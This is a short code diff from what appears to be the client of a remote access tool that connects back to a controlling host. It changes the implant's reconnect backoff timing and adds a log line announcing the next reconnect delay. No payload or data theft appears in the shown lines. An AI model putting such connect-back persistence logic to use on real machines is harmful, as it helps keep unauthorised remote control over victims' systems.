@@ -667,12 +667,12 @@ class BindSlaveService(ReverseSlaveService):
 
 
 def get_next_wait(attempt):
-    if attempt < 120:
-        return random.randint(5, 10) / 10.0
-    elif attempt < 320:
-        return random.randint(30, 50) / 10.0
+    if attempt < 10:
+        return random.randint(5, 10)
+    elif attempt < 50:
+        return random.randint(30, 50)
     else:
-        return random.randint(150, 300) / 10.0
+        return random.randint(150, 300)
 
 def set_connect_back_host(HOST):
     import pupy
@@ -807,7 +807,9 @@ def main():
 
         finally:
             if not sys.terminated:
-                time.sleep(get_next_wait(attempt))
+                sleep_secs = get_next_wait(attempt)
+                logger.info("reconnect in %d seconds...", sleep_secs)
+                time.sleep(sleep_secs)
                 attempt += 1
 
     logger.debug('Exited')
